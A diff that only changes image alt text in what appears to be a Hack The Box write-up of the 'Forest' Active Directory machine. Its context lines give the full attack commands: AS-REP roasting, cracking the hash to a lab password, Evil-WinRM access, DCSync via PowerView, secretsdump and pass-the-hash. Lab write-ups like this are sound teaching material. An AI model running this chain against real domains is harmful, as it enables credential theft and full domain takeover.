@@ -7,7 +7,7 @@ lang: en
 
 Today we are going to solve _Hack The Box's_ _Forest_ machine. It is a _Windows_ machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}
+![User Rated Difficulty](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png){:class="blog-image" onclick="expandImage(this)"}
 
 ### [](#header-3)Reconnaissance Phase
 
@@ -17,7 +17,7 @@ First, we’re going to launch an _ICMP traceroute_ to check if the machine is a
 ping -c 1 10.10.10.161
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"}
+![2](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png){:class="blog-image" onclick="expandImage(this)"}
 
 Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the _TTL_ value; in this case, the machine’s _TTL_ value is `127`, so we can infer that we are dealing with a _Windows_ machine. Remember, some of the reference values are as follows:
 
@@ -33,7 +33,7 @@ If we notice, in this case, the _TTL_ value is `127` instead of `128` as indicat
 ping -c 1 10.10.10.161 -R
 ``` 
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3b.png){:class="blog-image" onclick="expandImage(this)"}
+![3](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3b.png){:class="blog-image" onclick="expandImage(this)"}
 
 Next, we will use the _Nmap_ tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:
 
@@ -86,13 +86,13 @@ The first thing we’ll do is check if the machine has network-shared resources 
 smbmap -H 10.10.10.161
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}
+![4](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png){:class="blog-image" onclick="expandImage(this)"}
 
 ```bash
 smbclient -N -L 10.10.10.161
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}
+![5](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png){:class="blog-image" onclick="expandImage(this)"}
 
 Next, we can try to enumerate the `LDAP` protocol to obtain information about users, groups, or other objects in the environment. To do this, we will use the `ldapsearch` tool.
 
@@ -102,7 +102,7 @@ Our first goal will be to identify the _Naming Context_, which is the _Distingui
 ldapsearch -x -h 10.10.10.161 -s base namingcontexts
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}
+![6](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png){:class="blog-image" onclick="expandImage(this)"}
 
 The _dn_ field is empty because we are querying the base object of the directory. The _namingContexts_ fields list the different _Naming Contexts_ of the _LDAP_ server. Each entry in _namingContexts_ represents a different part of the _LDAP_ directory that can be the base for various searches.
 
@@ -127,7 +127,7 @@ We can start by searching for entries that contain the _user_ object class to li
 ldapsearch -x -h 10.10.10.161 -b "dc=htb,dc=local" '(objectClass=user)'
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"}
+![7](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png){:class="blog-image" onclick="expandImage(this)"}
 
 In the _sAMAccountName_ fields of each user, we will find their respective usernames. With a potential list of users at our disposal, we might consider an `AS-REP Roasting` attack.
 
@@ -135,13 +135,13 @@ The `AS-REP Roasting` attack exploits a weakness in `Kerberos` authentication in
 
 With this in mind, instead of searching for users manually one by one, we can use a one-liner to filter and parse the users directly.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"}
+![8](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png){:class="blog-image" onclick="expandImage(this)"}
 
 We can further refine the list of users obtained to focus exclusively on relevant accounts. The first two accounts, _DefaultAccount_ and _Guest_, are created by the _AD_ itself (although _Guest_ is not enabled by default). Accounts ending in _$_ are _computer accounts_, while the _$331000-VK4ADACQNUCA_ account has an unusual format and could be a special service account or automatically generated. Accounts starting with _SM\__ and _HealthMailbox_ are related to the _Microsoft Exchange_ service. This leaves us with five potential users for our analysis.
 
 The next thing we’ll do is use the `GetNPUsers` script from the `Impacket` suite. To run it, we need to provide the _AD_ domain name we want to target. To set this up, we will edit the `/etc/hosts` file to ensure that the domain name resolves to the corresponding IP address of the server.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}
+![9](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png){:class="blog-image" onclick="expandImage(this)"}
 
 With this done, the command we will use is the following:
 
@@ -149,29 +149,29 @@ With this done, the command we will use is the following:
 impacket-GetNPUsers htb.local/ -no-pass -userfile userListFile  
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}
+![10](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png){:class="blog-image" onclick="expandImage(this)"}
 
 Interestingly, none of the users we obtained seem to be vulnerable to `AS-REP Roasting`. Therefore, we will proceed to enumerate another protocol identified during our _Nmap_ scan, `RPC`.
 
 We will use `rpcclient`, again using a _null session_, as we don't have credentials. We verify that we can connect successfully, so we will proceed to enumerate additional information. We could list domain groups using _enumdomgroup_ or, alternatively, list domain users again using _enumdomusers_.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}
+![11](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png){:class="blog-image" onclick="expandImage(this)"}
 
 We observe three new users that we hadn’t detected when enumerating with _ldapsearch_. We’re interested in `svc-alfresco`, as both Administrator and krbtgt are created by the _AD_ itself.
 
 If we recall, when we used _ldapsearch_, we filtered for users whose object class contained _user_, and the five users we previously found meet this condition.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"}
+![12](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png){:class="blog-image" onclick="expandImage(this)"}
 
 However, upon further investigation, we discover that this "user" `svc-alfresco` does not have a defined object class. This is likely because it belongs to the _Organizational Unit (OU)_ of Service Accounts.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"}
+![13](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png){:class="blog-image" onclick="expandImage(this)"}
 
 Once again, by using a one-liner, we could filter and parse the users, refine the list, and use it with `Impacket` to check if this new user is vulnerable to `AS-REP Roasting`.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"}
+![14](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png){:class="blog-image" onclick="expandImage(this)"}
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}
+![15](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png){:class="blog-image" onclick="expandImage(this)"}
 
 We find that `svc-alfresco` is vulnerable to `AS-REP Roasting`, and we obtain a hash that we will attempt to crack by brute force using `John the Ripper` along with the [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/tag/data) dictionary.
 
@@ -185,7 +185,7 @@ sudo apt install john
 john --wordlist=/path/to/rockyou.txt/dictionary/ hash
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}
+![16](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png){:class="blog-image" onclick="expandImage(this)"}
 
 Once we obtain the password for the `svc-alfresco` user, we can validate the credential before attempting to connect to the target machine to ensure it is correct. Recall that during our _Nmap_ scan, we observed that the `WinRM` (_Windows Remote Management_) service is active on the target machine; this will be the protocol we will use for the connection.
 
@@ -195,7 +195,7 @@ To validate the credential, we will use _CrackMapExec_ with the following comman
 crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}
+![17](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png){:class="blog-image" onclick="expandImage(this)"}
 
 We realize that the credential is not only valid, but also that this user belongs to the _Remote Management Users_ group,  as we see a message next to the username saying _Pwn3d!_. Therefore, we can connect to the target machine using `Evil-WinRM`.
 
@@ -205,7 +205,7 @@ We will proceed to connect as follows:
 evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}
+![18](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png){:class="blog-image" onclick="expandImage(this)"}
 
 ### [](#header-3)Privilege Escalation
 
@@ -230,7 +230,7 @@ This will generate a compressed file containing all the _AD_ information. To dow
 download <timestamp>_BloodHound.zip BloodHound.zip
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}
+![19](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png){:class="blog-image" onclick="expandImage(this)"}
 
 The next step is to import the compressed file generated by `SharpHound` into `BloodHound`. If we don’t have the tool installed, we can do the following:
 
@@ -244,30 +244,30 @@ _Neo4j_ is the graph database used by `BloodHound`. We will start it as follows:
 sudo neo4j console
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png){:class="blog-image" onclick="expandImage(this)"}
+![20](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png){:class="blog-image" onclick="expandImage(this)"}
 
 It will instruct us to navigate to [http://localhost:7474/](http://localhost:7474/). To connect to _Neo4j_ for the first time, the default credentials we will enter are:
 
 * Username: neo4j
 * Password: neo4j
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png){:class="blog-image" onclick="expandImage(this)"}
+![21](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png){:class="blog-image" onclick="expandImage(this)"}
 
 It will then prompt us to change the password, which we will use for `BloodHound`.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png){:class="blog-image" onclick="expandImage(this)"}
+![22](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png){:class="blog-image" onclick="expandImage(this)"}
 
 Once we open `BloodHound` and log in, on the right side, we will see a section labeled _Upload Data_. This is where we will upload our compressed file.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png){:class="blog-image" onclick="expandImage(this)"}
+![23](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png){:class="blog-image" onclick="expandImage(this)"}
 
 In the search bar at the top left, we can search for the user we just compromised, `svc-alfresco`. We can right-click on it and select _Mark User as Owned_.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"}
+![24](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png){:class="blog-image" onclick="expandImage(this)"}
 
 If we go to the _Analysis_ section, we will find a _Shortest Paths_ section. Within this section, we select _Shortest Path from Owned Principals_. When we click, a graph will display showing the best path to become a system administrator.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"}
+![25](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png){:class="blog-image" onclick="expandImage(this)"}
 
 We can see that `svc-alfresco` is a member of the _Service Accounts_ group, which is a member of the _Privileged IT Accounts_ group, which in turn is a member of the _Account Operators_ group. Additionally, the _Account Operators_ group has _GenericAll_ permissions over the _Exchange Windows Permissions_ group, which grants it full control over this group. The _Exchange Windows Permissions_ group has _WriteDacl_ permissions over the domain, allowing it to modify the domain’s Discretionary Access Control List (_DACL_).
 
@@ -281,7 +281,7 @@ With all this said, the first thing we will do is take advantage of `svc-alfresc
 net user username password /add /domain
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"}
+![26](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png){:class="blog-image" onclick="expandImage(this)"}
 
 The next step is to add the newly created user to the _Exchange Windows Permissions_ group, taking advantage of the full control that `svc-alfresco` full control has over this group:
 
@@ -295,7 +295,7 @@ We will also add this user to the _Remote Management Users_ group so that it can
 Add-ADGroupMember -Identity "Remote Management Users" -Members "username"
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"}
+![27](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png){:class="blog-image" onclick="expandImage(this)"}
 
 By adding the user to the _Remote Management Users_ group, we avoid the use of _PSCredentials_, which are normally used to execute commands with another user’s credentials, which personally caused conflicts with `PowerView`.
 
@@ -306,7 +306,7 @@ upload PowerView.ps1
 Import-Module .\PowerView.ps1
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}
+![28](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png){:class="blog-image" onclick="expandImage(this)"}
 
 Once imported, we will use the `Add-DomainObjectAcl` function to grant `DCsync` permissions to our newly created user:
 
@@ -314,7 +314,7 @@ Once imported, we will use the `Add-DomainObjectAcl` function to grant `DCsync` 
 Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity username -Rights DCSync
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}
+![29](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png){:class="blog-image" onclick="expandImage(this)"}
 
 With `DCsync` permissions granted to our user, we can use `secretsdump`, another script from the `Impacket` suite, to dump all domain users’ hashes:
 
@@ -322,7 +322,7 @@ With `DCsync` permissions granted to our user, we can use `secretsdump`, another
 impacket-secretsdump htb.local/username:password@10.10.10.161
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}
+![30](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png){:class="blog-image" onclick="expandImage(this)"}
 
 Finally, we can perform a `Pass the Hash` attack, which involves using the _hash_ we just obtained instead of the password (which we don’t know) to authenticate. For this, we could use `psexec` (another script from `Impacket`) or alternatively, via `Evil-WinRM` itself.
 
@@ -330,10 +330,10 @@ Finally, we can perform a `Pass the Hash` attack, which involves using the _hash
 evil-winrm -i 10.10.10.161 -u 'Administrator' -H 'HASH'
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}
+![31](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png){:class="blog-image" onclick="expandImage(this)"}
 
 ```bash
 impacket-psexec administrator@10.10.10.161 -hash HASH
 ```
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}
+![32](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png){:class="blog-image" onclick="expandImage(this)"}
